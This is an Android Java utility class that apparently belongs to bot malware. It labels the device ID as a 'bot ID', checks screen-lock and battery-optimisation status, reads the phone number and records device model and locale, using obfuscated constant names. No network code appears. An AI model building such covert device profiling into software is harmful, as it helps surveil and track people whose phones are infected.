package com.example.mmm.Utils;

import android.app.KeyguardManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.example.mmm.constants;

import java.util.List;
import java.util.Locale;
import java.util.Random;


import static android.content.Context.POWER_SERVICE;

public class idUtils {
    constants consts = new constants();

    public String IDBot(Context context){
        String IDBot = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        return IDBot.equals("")?randomString(16):IDBot;
    }


    public String getScreen(Context context){
        KeyguardManager km = (KeyguardManager) context.getSystemService(context.KEYGUARD_SERVICE);
        boolean locked = km.inKeyguardRestrictedInputMode();
        if (!locked)
            return consts.str_1;
        else
            return consts.str_step;
    }
    public String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.toLowerCase().startsWith(manufacturer.toLowerCase())) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }
    public String randomString(int length) {
        String chars = consts.str_qwergasdzxc;
        Random rand = new Random();
        StringBuilder buf = new StringBuilder();
        for (int i=0; i<length; i++) {
            buf.append(chars.charAt(rand.nextInt(chars.length())));
        }
        return buf.toString();
    }

    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }


    public boolean is_dozemode(Context context){
        if (Build.VERSION.SDK_INT >= 23) {
            PowerManager powerManager = (PowerManager) context.getSystemService(POWER_SERVICE);
            return powerManager.isIgnoringBatteryOptimizations(context.getPackageName());
        }
        else{
            return true;
        }
    }

   /* public boolean isPermissionDisk(Context context){
        if (hasPermission(context, consts.WRITE_EXTERNAL_STORAGE[0])) {
            return true;
        } else {
            return false;
        }
    }*/

    public String getNumber(Context context){
        if ((context.checkCallingOrSelfPermission(consts.strREAD_PHONE_STATE) == PackageManager.PERMISSION_GRANTED)){
            TelephonyManager tManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            return tManager.getLine1Number();
        }
        return "";
    }

    public String localeFull(){
        return Locale.getDefault().toString().toLowerCase();
    }

    public String locale(){
        return Locale.getDefault().toString().toLowerCase();
    }







}
